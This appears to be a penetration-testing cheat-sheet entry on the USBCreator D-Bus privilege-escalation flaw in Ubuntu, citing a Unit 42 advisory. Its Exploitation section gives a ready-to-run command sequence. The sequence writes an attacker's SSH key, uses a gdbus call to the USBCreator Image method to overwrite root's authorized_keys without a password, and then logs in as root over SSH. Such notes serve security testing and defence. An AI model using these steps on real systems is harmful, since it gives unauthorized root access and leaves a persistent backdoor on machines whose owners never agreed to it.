# USBCreator D-Bus Privilege Escalation 
A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. 

# Overview
If a running process uses `com.ubuntu.USBCreator` and the process is privileged one can move onto the explitation phase.

# Exploitation
This particular example is for adding the attacker's `SSH` key to the authorised keys, so that they can login without a password.
```bash
remote-machine> ps auwx | grep usb
remote-machine> echo "attacker_idrsa_key" > ~/authorized_keys
remote-machine> gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/remote/authorized_keys /root/.ssh/authorized_keys true
attack-machine> ssh -i id_rsa root@10.10.10.10
```

# References
- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)